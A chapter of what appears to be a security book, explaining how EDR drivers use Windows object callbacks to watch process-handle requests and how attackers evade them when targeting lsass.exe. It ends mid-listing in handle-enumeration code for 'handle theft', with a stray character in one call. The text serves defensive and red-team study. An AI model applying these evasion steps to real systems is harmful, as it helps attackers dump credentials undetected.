<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch4">&#13;
<header>&#13;
<h1 class="CHAPTER" id="ch4">&#13;
<span class="CN"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_61" aria-label=" Page 61. "/><samp class="SANS_Futura_Std_Bold_Condensed_B_11">4</samp></span>&#13;
<span class="CT"><samp class="SANS_Dogma_OT_Bold_B_11">OBJECT NOTIFICATIONS</samp></span>&#13;
</h1>&#13;
</header>&#13;
<figure class="opener"><img class="opener" src="../images/opener-img.png" alt=""/>&#13;
</figure>&#13;
<p class="CO">Process and thread events are only the tip of the iceberg when it comes to monitoring system activity with callback routines. On Windows, developers can also capture requests for handles to objects, which provide valuable telemetry related to adversary activity.</p>&#13;
<p class="TX"><i>Objects</i> are a way to abstract resources such as files, processes, tokens, and registry keys. A centralized broker, aptly named the <i>object manager</i>, handles tasks like overseeing the creation and destruction of objects, keeping track of resource assignments, and managing an object’s lifetime. In addition, the object manager notifies registered callbacks when code requests handles to processes, threads, and desktop objects. EDRs find these notifications useful because many attacker techniques, from credential dumping to remote process injection, involve opening such handles.</p>&#13;
<p class="TX">In this chapter, we explore one function of the object manager: its ability to notify drivers when certain types of object-related actions occur on the system. Then, of course, we discuss how attackers can evade these detection activities.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
<h2 class="H1" id="sec1"><span id="h-45"/><span role="doc-pagebreak" epub:type="pagebreak" id="pg_62" aria-label=" Page 62. "/><samp class="SANS_Futura_Std_Bold_B_11">How Object Notifications Work</samp></h2>&#13;
<p class="TNI">As for all the other notification types, EDRs can register an object-callback routine using a single function, in this case, <samp class="SANS_TheSansMonoCd_W5Regular_11">nt!ObRegisterCallbacks()</samp>. Let’s take a look at this function to see how it works and then practice implementing an object-callback routine.</p>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
<h3 class="H2" id="sec2"><span id="h-46"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Registering a New Callback</samp></h3>&#13;
<p class="TNI">At first glance, the registration function seems simple, requiring only two pointers as parameters: the <samp class="SANS_TheSansMonoCd_W5Regular_11">CallbackRegistration</samp> parameter, which specifies the callback routine itself and other registration information, and the <samp class="SANS_TheSansMonoCd_W5Regular_11">RegistrationHandle</samp>, which receives a value passed when the driver wishes to unregister the callback routine.</p>&#13;
<p class="TX">Despite the function’s simple definition, the structure passed in via the <samp class="SANS_TheSansMonoCd_W5Regular_11">CallbackRegistration</samp> parameter is anything but. <a href="#list4-1">Listing 4-1</a> shows its definition.</p>&#13;
<pre id="list4-1"><code>typedef struct _OB_CALLBACK_REGISTRATION {&#13;
  USHORT                    Version;&#13;
  USHORT                    OperationRegistrationCount;&#13;
  UNICODE_STRING            Altitude;&#13;
  PVOID                     RegistrationContext;&#13;
  OB_OPERATION_REGISTRATION *OperationRegistration;&#13;
} OB_CALLBACK_REGISTRATION, *POB_CALLBACK_REGISTRATION;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-1: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">OB_CALLBACK_REGISTRATION</samp> structure definition</span></p>&#13;
<p class="TX">You’ll find some of these values to be fairly straightforward. The version of the object-callback registration will always be <samp class="SANS_TheSansMonoCd_W5Regular_11">OB_FLT_REGISTRATION_VERSION</samp> (0x0100). The <samp class="SANS_TheSansMonoCd_W5Regular_11">OperationRegistrationCount</samp> member is the number of callback registration structures passed in the <samp class="SANS_TheSansMonoCd_W5Regular_11">OperationRegistration</samp> member, and the <samp class="SANS_TheSansMonoCd_W5Regular_11">RegistrationContext</samp> is some value passed as is to the callback routines whenever they are invoked and is set to null more often than not.</p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">Altitude</samp> member is a string indicating the order in which the callback routines should be invoked. A pre-operation routine with a higher altitude will run earlier, and a post-operation routine with a higher altitude will execute later. You can set this value to anything so long as the value isn’t in use by another driver’s routines. Thankfully, Microsoft allows the use of decimal numbers, rather than merely whole numbers, reducing the overall chances of altitude collisions.</p>&#13;
<p class="TX">This registration function centers on its <samp class="SANS_TheSansMonoCd_W5Regular_11">OperationRegistration</samp> parameter and the array of registration structures it points to. This structure’s definition is shown in <a href="#list4-2">Listing 4-2</a>. Each structure in this array specifies whether the function is registering a pre-operation or post-operation callback routine.</p>&#13;
<pre id="list4-2"><code>typedef struct _OB_OPERATION_REGISTRATION {&#13;
  POBJECT_TYPE                *ObjectType;&#13;
  OB_OPERATION                Operations;&#13;
  POB_PRE_OPERATION_CALLBACK  PreOperation;<span role="doc-pagebreak" epub:type="pagebreak" id="pg_63" aria-label=" Page 63. "/>&#13;
  POB_POST_OPERATION_CALLBACK PostOperation;&#13;
} OB_OPERATION_REGISTRATION, *POB_OPERATION_REGISTRATION;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-2: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">OB_OPERATION_REGISTRATION</samp> structure definition</span></p>&#13;
<p class="TX"><a href="#tab4-1">Table 4-1</a> describes each member and its purpose. If you’re curious about what exactly a driver is monitoring, these structures hold the bulk of the information in which you’ll be interested.</p>&#13;
<figure class="table">&#13;
<table class="table">&#13;
<caption>&#13;
<p class="TT" id="tab4-1"><samp class="SANS_Futura_Std_Heavy_B_11">Table 4-1:</samp> <samp class="SANS_Futura_Std_Book_11">Members of the</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">OB_OPERATION_REGISTRATION</samp> <samp class="SANS_Futura_Std_Book_11">Structure</samp></p>&#13;
</caption>&#13;
<thead>&#13;
<tr class="table">&#13;
<th class="table TCH" scope="col">&#13;
<p class="TCH"><samp class="SANS_Futura_Std_Heavy_B_11">Member</samp></p>&#13;
</th>&#13;
<th class="table TCH" scope="col">&#13;
<p class="TCH"><samp class="SANS_Futura_Std_Heavy_B_11">Purpose</samp></p>&#13;
</th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr class="table">&#13;
<td class="table TBF">&#13;
<p class="TB"><samp class="SANS_TheSansMonoCd_W5Regular_11">ObjectType</samp></p>&#13;
</td>&#13;
<td class="table TBF">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">A pointer to the type of object the driver developer wishes to monitor.</samp> <samp class="SANS_Futura_Std_Book_11">At the time of this writing, there are three supported values:</samp></p>&#13;
<ul class="TBBL">&#13;
<li class="TBBL"><samp class="SANS_TheSansMonoCd_W5Regular_11">PsProcessType</samp> <samp class="SANS_Futura_Std_Book_11">(processes)</samp></li>&#13;
<li class="TBBL"><samp class="SANS_TheSansMonoCd_W5Regular_11">PsThreadType</samp> <samp class="SANS_Futura_Std_Book_11">(threads)</samp></li>&#13;
<li class="TBBL"><samp class="SANS_TheSansMonoCd_W5Regular_11">ExDesktopObjectType</samp> <samp class="SANS_Futura_Std_Book_11">(desktops)</samp></li>&#13;
</ul>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_TheSansMonoCd_W5Regular_11">Operations</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">A flag indicating the type of handle operation to be monitored. This can be either</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">OB_OPERATION_HANDLE_CREATE</samp><samp class="SANS_Futura_Std_Book_11">, to monitor requests for new handles, or</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">OB_OPERATION_HANDLE_DUPLICATE</samp><samp class="SANS_Futura_Std_Book_11">, to monitor handle-duplication requests.</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_TheSansMonoCd_W5Regular_11">PreOperation</samp></p>&#13;
</td>&#13;
<td class="table TB">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">A pointer to a pre-operation callback routine. This routine will be invoked before the handle operation completes.</samp></p>&#13;
</td>&#13;
</tr>&#13;
<tr class="table">&#13;
<td class="table TBL">&#13;
<p class="TB"><samp class="SANS_TheSansMonoCd_W5Regular_11">PostOperation</samp></p>&#13;
</td>&#13;
<td class="table TBL">&#13;
<p class="TB"><samp class="SANS_Futura_Std_Book_11">A pointer to a post-operation callback routine. This routine will be invoked after the handle operation completes.</samp></p>&#13;
</td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
</figure>&#13;
<p class="TX">We’ll discuss these members further in <span class="Xref">“Detecting a Driver’s Actions Once Triggered” on <a href="#sec5">page 66</a></span>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
<h3 class="H2" id="sec3"><span id="h-47"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Monitoring New and Duplicate Process-Handle Requests</samp></h3>&#13;
<p class="TNI">EDRs commonly implement pre-operation callbacks to monitor new and duplicate process-handle requests. While monitoring thread- and desktop-handle requests can also be useful, attackers request process handles more frequently, so they generally provide more relevant information. <a href="#list4-3">Listing 4-3</a> shows how an EDR might implement such a callback in a driver.</p>&#13;
<pre id="list4-3"><code>PVOID g_pObCallbackRegHandle;&#13;
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegPath)&#13;
{&#13;
    NTSTATUS status = STATUS_SUCCESS;&#13;
    OB_CALLBACK_REGISTRATION CallbackReg;&#13;
    OB_OPERATION_REGISTRATION OperationReg;&#13;
&#13;
    RtlZeroMemory(&amp;CallbackReg, sizeof(OB_CALLBACK_REGISTRATION));&#13;
    RtlZeroMemory(&amp;OperationReg, sizeof(OB_OPERATION_REGISTRATION));&#13;
&#13;
    <var>--snip--</var>&#13;
&#13;
    CallbackReg.Version = OB_FLT_REGISTRATION_VERSION;&#13;
 <span class="CodeAnnotationCode" aria-label="annotation1">❶</span> CallbackReg.OperationRegistrationCount = 1;<span role="doc-pagebreak" epub:type="pagebreak" id="pg_64" aria-label=" Page 64. "/>&#13;
    RtlInitUnicodeString(&amp;CallbackReg.Altitude, <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> L"28133.08004");&#13;
    CallbackReg.RegistrationContext = NULL;&#13;
&#13;
    OperationReg.ObjectType = <span class="CodeAnnotationCode-1" aria-label="annotation3">❸</span> PsProcessType;&#13;
    OperationReg.Operations = <span class="CodeAnnotationCode-1" aria-label="annotation4">❹</span> OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;&#13;
 <span class="CodeAnnotationCode" aria-label="annotation5">❺</span> OperationReg.PreOperation = ObjectNotificationCallback;&#13;
&#13;
    CallbackReg.OperationRegistration = <span class="CodeAnnotationCode" aria-label="annotation6">❻</span> &amp;OperationReg;&#13;
&#13;
    status = <span class="CodeAnnotationCode" aria-label="annotation7">❼</span> ObRegisterCallbacks(&amp;CallbackReg, &amp;g_pObCallbackRegHandle);&#13;
    if (!NT_SUCCESS(status))&#13;
    {&#13;
       return status;&#13;
    }&#13;
&#13;
    <var>--snip--</var>&#13;
}&#13;
OB_PREOP_CALLBACK_STATUS ObjectNotificationCallback(&#13;
  PVOID RegistrationContext,&#13;
  POB_PRE_OPERATION_INFORMATION Info)&#13;
{&#13;
      <var>--snip--</var>&#13;
}</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-3: Registering a pre-operation callback notification routine</span></p>&#13;
<p class="TX">In this example driver, we begin by populating the callback registration structure. The two most important members are <samp class="SANS_TheSansMonoCd_W5Regular_11">OperationRegistrationCount</samp>, which we set to <samp class="SANS_TheSansMonoCd_W5Regular_11">1</samp>, indicating that we are registering only one callback routine <span class="CodeAnnotation" aria-label="annotation1">❶</span>, and the altitude, which we set to an arbitrary value <span class="CodeAnnotation" aria-label="annotation2">❷</span> to avoid collisions with other drivers’ routines.</p>&#13;
<p class="TX">Next, we set up the operation-registration structure. We set <samp class="SANS_TheSansMonoCd_W5Regular_11">ObjectType</samp> to <samp class="SANS_TheSansMonoCd_W5Regular_11">PsProcessType</samp> <span class="CodeAnnotation" aria-label="annotation3">❸</span> and <samp class="SANS_TheSansMonoCd_W5Regular_11">Operations</samp> to values that indicate we’re interested in monitoring new or duplicate process-handle operations <span class="CodeAnnotation" aria-label="annotation4">❹</span>. Lastly, we set our <samp class="SANS_TheSansMonoCd_W5Regular_11">PreOperation</samp> member to point to our internal callback function <span class="CodeAnnotation" aria-label="annotation5">❺</span>.</p>&#13;
<p class="TX">Finally, we tie our operation-registration structure into the callback registration structure by passing a pointer to it in the <samp class="SANS_TheSansMonoCd_W5Regular_11">OperationRegistration</samp> member <span class="CodeAnnotation" aria-label="annotation6">❻</span>. At this point, we’re ready to call the registration function <span class="CodeAnnotation" aria-label="annotation7">❼</span>. When this function completes, our callback routine will start receiving events, and we’ll receive a value that we can pass to the registration function to unregister the routine.</p>&#13;
</section>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
<h2 class="H1" id="sec4"><span id="h-48"/><samp class="SANS_Futura_Std_Bold_B_11">Detecting Objects an EDR Is Monitoring</samp></h2>&#13;
<p class="TNI">How can we detect which objects an EDR is monitoring? As with the other types of notifications, when a registration function is called, the system will add the callback routine to an array of routines. In the case of object callbacks, however, the array isn’t quite as straightforward as others.</p>&#13;
<p class="TX">Remember those pointers we passed into the operation-registration structure to say what type of object we were interested in monitoring? So <span role="doc-pagebreak" epub:type="pagebreak" id="pg_65" aria-label=" Page 65. "/>far in this book, we’ve mostly encountered pointers to structures, but these pointers instead reference values in an enumeration. Let’s take a look at <samp class="SANS_TheSansMonoCd_W5Regular_11">nt!PsProcessType</samp> to see what’s going on. Object types like <samp class="SANS_TheSansMonoCd_W5Regular_11">nt!PsProcessType</samp> are really <samp class="SANS_TheSansMonoCd_W5Regular_11">OBJECT_TYPE</samp> structures. <a href="#list4-4">Listing 4-4</a> shows what these look like on a live system using the WinDbg debugger.</p>&#13;
<pre id="list4-4"><code>2: kd&gt; <b>dt nt!_OBJECT_TYPE poi(nt!PsProcessType)</b>&#13;
  +0x000 TypeList         : _LIST_ENTRY [0xffffad8b`9ec8e220 - 0xffffad8b`9ec8e220]&#13;
  +0x010 Name             : _UNICODE_STRING "Process"&#13;
  +0x020 DefaultObject    : (null)&#13;
  +0x028 Index            : 0x7 ' '&#13;
  +0x02c TotalNumberOfObjects : 0x7c&#13;
  +0x030 TotalNumberOfHandles : 0x4ce&#13;
  +0x034 HighWaterNumberOfObjects  : 0x7d&#13;
  +0x038 HighWaterNumberOfHandles  : 0x4f1&#13;
  +0x040 TypeInfo         : _OBJECT_TYPE_INITIALIZER&#13;
  +0x0b8 TypeLock         : _EX_PUSH_LOCK&#13;
  +0x0c0 Key              : 0x636f7250&#13;
  +0x0c8 CallbackList     : _LIST_ENTRY [0xffff9708`64093680 - 0xffff9708`64093680]</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-4: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">nt!_OBJECT_TYPE</samp> pointed to by <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">nt!PsProcessType</samp></span></p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">CallbackList</samp> entry at offset 0x0c8 is particularly interesting to us, as it points to a <samp class="SANS_TheSansMonoCd_W5Regular_11">LIST_ENTRY</samp> structure, which is the entry point, or header, of a doubly linked list of callback routines associated with the process object type. Each entry in the list points to an undocumented <samp class="SANS_TheSansMonoCd_W5Regular_11">CALLBACK_ENTRY_ITEM</samp> structure. This structure’s definition is included in <a href="#list4-5">Listing 4-5</a>.</p>&#13;
<pre id="list4-5"><code>Typedef struct _CALLBACK_ENTRY_ITEM {&#13;
    LIST_ENTRY EntryItemList;&#13;
    OB_OPERATION Operations;&#13;
    DWORD Active;&#13;
    PCALLBACK_ENTRY CallbackEntry;&#13;
    POBJECT_TYPE ObjectType;&#13;
    POB_PRE_OPERATION_CALLBACK PreOperation;&#13;
    POB_POST_OPERATION_CALLBACK PostOperation;&#13;
    __int64 unk;&#13;
} CALLBACK_ENTRY_ITEM, * PCALLBACK_ENTRY_ITEM;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-5: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">CALLBACK_ENTRY_ITEM</samp> structure definition</span></p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">PreOperation</samp> member of this structure resides at offset 0x028. If we can traverse the linked list of callbacks and get the symbol at the address pointed to by this member in each structure, we can enumerate the drivers that are monitoring process-handle operations. WinDbg comes to the rescue once again, as it supports scripting to do exactly what we want, as demonstrated in <a href="#list4-6">Listing 4-6</a>.</p>&#13;
<pre id="list4-6"><code>2: kd&gt; <b>!list -x ".if (poi(@$extret+0x28) != 0) {lmDva (poi(@$extret+0x28));}"</b>&#13;
<b>(poi(nt!PsProcessType)+0xc8)</b>&#13;
&#13;
Browse full module list&#13;
start             end               module name<span role="doc-pagebreak" epub:type="pagebreak" id="pg_66" aria-label=" Page 66. "/>&#13;
fffff802`73b80000 fffff802`73bf2000 WdFilter (no symbols)&#13;
    Loaded symbol image file: WdFilter.sys&#13;
  <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> Image path: \SystemRoot\system32\drivers\wd\WdFilter.sys&#13;
    Image name: WdFilter.sys&#13;
    Browse all global symbols functions data&#13;
    Image was built with /Brepro flag.&#13;
    Timestamp:        629E0677 (This is a reproducible build file hash, not a timestamp)&#13;
    CheckSum:         0006EF0F&#13;
    ImageSize:        00072000&#13;
    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4&#13;
    Information from resource tables:</code></pre>&#13;
<p class="CodeListingCaptionWide"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-6: Enumerating pre-operation callbacks for process-handle operations</span></p>&#13;
<p class="TX">This debugger command essentially says, “Traverse the linked list starting at the address pointed to by the <samp class="SANS_TheSansMonoCd_W5Regular_11">CallbackList</samp> member of the <samp class="SANS_TheSansMonoCd_W5Regular_11">nt!_OBJECT_TYPE</samp> structure for <samp class="SANS_TheSansMonoCd_W5Regular_11">nt!PsProcessType</samp>, printing out the module information if the address pointed to by the <samp class="SANS_TheSansMonoCd_W5Regular_11">PreOperation</samp> member is not null.”</p>&#13;
<p class="TX">On my test system, Defender’s <i>WdFilter.sys</i> <span class="CodeAnnotation" aria-label="annotation1">❶</span> is the only driver with a registered callback. On a real system with an EDR deployed, you will almost certainly see the EDR’s driver registered alongside Defender. You can use the same process to enumerate callbacks that monitor thread- or desktop-handle operations, but those are usually far less common. Additionally, if Microsoft were to add the ability to register callbacks for other types of object-handle operations, such as for tokens, this process could enumerate them as well.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
<h2 class="H1" id="sec5"><span id="h-49"/><samp class="SANS_Futura_Std_Bold_B_11">Detecting a Driver’s Actions Once Triggered</samp></h2>&#13;
<p class="TNI">While you’ll find it useful to know what types of objects an EDR is interested in monitoring, the most valuable piece of information is what the driver actually does when triggered. An EDR can do a bunch of things, from silently observing the code’s activities to actively interfering with requests. To understand what the driver might do, we first need to look at the data with which it works.</p>&#13;
<p class="TX">When some handle operation invokes a registered callback, the callback will receive a pointer to either an <samp class="SANS_TheSansMonoCd_W5Regular_11">OB_PRE_OPERATION_INFORMATION</samp> structure, if it is a pre-operation callback, or an <samp class="SANS_TheSansMonoCd_W5Regular_11">OB_POST_OPERATION_INFORMATION</samp> structure, if it is a post-operation routine. These structures are very similar, but the post-operation version contains only the return code of the handle operation, and its data can’t be changed. Pre-operation callbacks are far more prevalent because they offer the driver the ability to intercept and modify the handle operation. Therefore, we’ll focus our attention on the pre-operation structure, shown in <a href="#list4-7">Listing 4-7</a>.</p>&#13;
<pre id="list4-7"><code>typedef struct _OB_PRE_OPERATION_INFORMATION {&#13;
  OB_OPERATION                 Operation;&#13;
  union {&#13;
    ULONG Flags;&#13;
    struct {&#13;
      ULONG KernelHandle : 1;&#13;
      ULONG Reserved : 31;<span role="doc-pagebreak" epub:type="pagebreak" id="pg_67" aria-label=" Page 67. "/>&#13;
    };&#13;
  };&#13;
  PVOID                        Object;&#13;
  POBJECT_TYPE                 ObjectType;&#13;
  PVOID                        CallContext;&#13;
  POB_PRE_OPERATION_PARAMETERS Parameters;&#13;
} OB_PRE_OPERATION_INFORMATION, *POB_PRE_OPERATION_INFORMATION;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-7: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">OB_PRE_OPERATION_INFORMATION</samp> structure definition</span></p>&#13;
<p class="TX">Just like the process of registering the callback, parsing the notification data is a little more complex than it looks. Let’s step through the important pieces together. First, the <samp class="SANS_TheSansMonoCd_W5Regular_11">Operation</samp> handle identifies whether the operation being performed is the creation of a new handle or the duplication of an existing one. An EDR’s developer can use this handle to take different actions based on the type of operation it is processing. Also, if the <samp class="SANS_TheSansMonoCd_W5Regular_11">KernelHandle</samp> value isn’t zero, the handle is a kernel handle, and a callback function will rarely process it. This allows the EDR to further reduce the scope of events that it needs to monitor to provide effective coverage.</p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">Object</samp> pointer references the handle operation’s target. The driver can use it to further investigate this target, such as to get information about its process. The <samp class="SANS_TheSansMonoCd_W5Regular_11">ObjectType</samp> pointer indicates whether the operation is targeting a process or a thread, and the <samp class="SANS_TheSansMonoCd_W5Regular_11">Parameters</samp> pointer references a structure that indicates the type of operation being processed (either handle creation or duplication).</p>&#13;
<p class="TX">The driver uses pretty much everything in this structure leading up to the <samp class="SANS_TheSansMonoCd_W5Regular_11">Parameters</samp> member to filter the operation. Once it knows what type of object it is working with and what types of operations it will be processing, it will rarely perform additional checks beyond figuring out whether the handle is a kernel handle. The real magic begins once we start processing the structure pointed to by the <samp class="SANS_TheSansMonoCd_W5Regular_11">Parameters</samp> member. If the operation is for the creation of a new handle, we’ll receive a pointer to the structure defined in <a href="#list4-8">Listing 4-8</a>.</p>&#13;
<pre id="list4-8"><code>typedef struct _OB_PRE_CREATE_HANDLE_INFORMATION {&#13;
  ACCESS_MASK DesiredAccess;&#13;
  ACCESS_MASK OriginalDesiredAccess;&#13;
} OB_PRE_CREATE_HANDLE_INFORMATION, *POB_PRE_CREATE_HANDLE_INFORMATION;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-8: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">OB_PRE_CREATE_HANDLE_INFORMATION</samp> structure definition</span></p>&#13;
<p class="TX">The two <samp class="SANS_TheSansMonoCd_W5Regular_11">ACCESS_MASK</samp> values both specify the access rights to grant to the handle. These might be set to values like <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_VM_OPERATION</samp> or <samp class="SANS_TheSansMonoCd_W5Regular_11">THREAD_SET_THREAD_TOKEN</samp>, which might be passed to functions in the <samp class="SANS_TheSansMonoCd_W5Regular_11">dwDesiredAccess</samp> parameter when opening a process or thread.</p>&#13;
<p class="TX">You may be wondering why this structure contains two copies of the same value. Well, the reason is that pre-operation notifications give the driver the ability to modify requests. Let’s say the driver wants to prevent processes from reading the memory of the <i>lsass.exe</i> process. To read that <span role="doc-pagebreak" epub:type="pagebreak" id="pg_68" aria-label=" Page 68. "/>process’s memory, the attacker would first need to open a handle with the appropriate rights, so they might request <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_ALL_ACCESS</samp>. The driver would receive this new process-handle notification and see the requested access mask in the structure’s <samp class="SANS_TheSansMonoCd_W5Regular_11">OriginalDesiredAccess</samp> member. To prevent the access, the driver could remove <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_VM_READ</samp> by flipping the bit associated with this access right in the <samp class="SANS_TheSansMonoCd_W5Regular_11">DesiredAccess</samp> member using the bitwise complement operator (<i>~</i>). Flipping this bit stops the handle from gaining that particular right but allows it to retain all the other requested rights.</p>&#13;
<p class="TX">If the operation is for the duplication of an existing handle, we’ll receive a pointer to the structure defined in <a href="#list4-9">Listing 4-9</a>, which includes two additional pointers.</p>&#13;
<pre id="list4-9"><code>typedef struct _OB_PRE_DUPLICATE_HANDLE_INFORMATION {&#13;
  ACCESS_MASK DesiredAccess;&#13;
  ACCESS_MASK OriginalDesiredAccess;&#13;
  PVOID       SourceProcess;&#13;
  PVOID       TargetProcess;&#13;
} OB_PRE_DUPLICATE_HANDLE_INFORMATION, *POB_PRE_DUPLICATE_HANDLE_INFORMATION;</code></pre>&#13;
<p class="CodeListingCaption"><span class="eSANS_Futura_Std_Book_Oblique_I_11a">Listing 4-9: The <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">OB_PRE_DUPLICATE_HANDLE_INFORMATION</samp> structure definition</span></p>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">SourceProcess</samp> member is a pointer to the process object from which the handle originated, and <samp class="SANS_TheSansMonoCd_W5Regular_11">TargetProcess</samp> is a pointer to the process receiving the handle. These match the <samp class="SANS_TheSansMonoCd_W5Regular_11">hSourceProcessHandle</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">hTargetProcessHandle</samp> parameters passed to the handle-duplication kernel function.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
<h2 class="H1" id="sec6"><span id="h-50"/><samp class="SANS_Futura_Std_Bold_B_11">Evading Object Callbacks During an Authentication Attack</samp></h2>&#13;
<p class="TNI">Undeniably one of the processes that attackers target most often is <i>lsass.exe</i>, which is responsible for handling authentication in user mode. Its address space may contain cleartext authentication credentials that attackers can extract with tools such as Mimikatz, ProcDump, and even the Task Manager.</p>&#13;
<p class="TX">Because attackers have targeted <i>lsass.exe</i> so extensively, security vendors have invested considerable time and effort into detecting its abuse. Object-callback notifications are one of their strongest data sources for this purpose. To determine whether activity is malicious, many EDRs rely on three pieces of information passed to their callback routine on each new process-handle request: the process from which the request was made, the process for which the handle is being requested, and the <i>access mask</i>, or the rights requested by the calling process.</p>&#13;
<p class="TX">For example, when an operator requests a new process handle to <i>lsass.exe</i>, the EDR’s driver will determine the identity of the calling process and check whether the target is <i>lsass.exe</i>. If so, it might evaluate the requested access rights to see whether the requestor asked for <samp class="SANS_TheSansMonoCd_W5Regular_11">PROCESS_VM_READ</samp>, which it would need to read process memory. Next, if the requestor <span role="doc-pagebreak" epub:type="pagebreak" id="pg_69" aria-label=" Page 69. "/>doesn’t belong to a list of processes that should be able to access <i>lsass.exe</i>, the driver might opt to return an invalid handle or one with a modified access mask and notify the agent of the potentially malicious behavior.</p>&#13;
<p class="NOTE"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_21">NOTE</samp></span></p>&#13;
<p class="NOTE-TXT"><i>Defenders can sometimes identify specific attacker tools based on the access masks requested. Many offensive tools request excessive access masks, such as <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">PROCESS_ALL_ACCESS</samp>, or atypical ones, such as Mimikatz’s request for <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION</samp>, when opening process handles.</i></p>&#13;
<p class="TX">In summary, an EDR makes three assumptions in its detection strategy: that the calling process will open a new handle to <i>lsass.exe</i>, that the process will be atypical, and that the requested access mask will allow the requestor to read <i>lsass.exe</i>’s memory. Attackers might be able to use these assumptions to bypass the detection logic of the agent.</p>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
<h3 class="H2" id="sec7"><span id="h-51"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_BI_11">Performing Handle Theft</samp></h3>&#13;
<p class="TNI">One way attackers can evade detection is to duplicate a handle to <i>lsass.exe</i> owned by another process. They can discover these handles through the <samp class="SANS_TheSansMonoCd_W5Regular_11">ntdll!NtQuerySystemInformation</samp><samp class="SANS_TheSansMonoCd_W5Regular_11">()</samp> API, which provides an incredibly useful feature: the ability to view the system’s handle table as an unprivileged user. This table contains a list of all the handles open on the systems, including objects such as mutexes, files, and, most importantly, processes. <a href="#list4-10">Listing 4-10</a> shows how malware might query this API.</p>&#13;
<pre id="list4-10"><code>PSYSTEM_HANDLE_INFORMATION GetSystemHandles()&#13;
{&#13;
    NTSTATUS status = STATUS_SUCCESS;&#13;
    PSYSTEM_HANDLE_INFORMATION pHandleInfo = NULL;&#13;
    ULONG ulSize = sizeof(SYSTEM_HANDLE_INFORMATION);&#13;
&#13;
    pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(ulSize);&#13;
    if (!pHandleInfo)&#13;
    {&#13;
        return NULL;&#13;
    }&#13;
&#13;
    status = NtQuerySystemInformation(&#13;
      <span class="CodeAnnotationCode-1" aria-label="annotation1">❶</span> SystemHandleInformation,&#13;
        pHandleInfo,&#13;
        ulSize, &amp;ulSize);&#13;
&#13;
    while (status == STATUS_INFO_LENGTH_MISMATCH)&#13;
    {&#13;
        free(pHandleInfo);&#13;
        pHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(ulSize);&#13;
        status = NtQuerySystemInformation(&#13;
            SystemHandleInformation, 1&#13;
          <span class="CodeAnnotationCode-1" aria-label="annotation2">❷</span> pHandleInfo,&#13;
            ulSize, &amp;ulSize);&#13;
    }<span role="doc-pagebreak" epub:type="pagebreak" id="pg_70" aria-label=" Page 70. "/>&#13;
&#13;
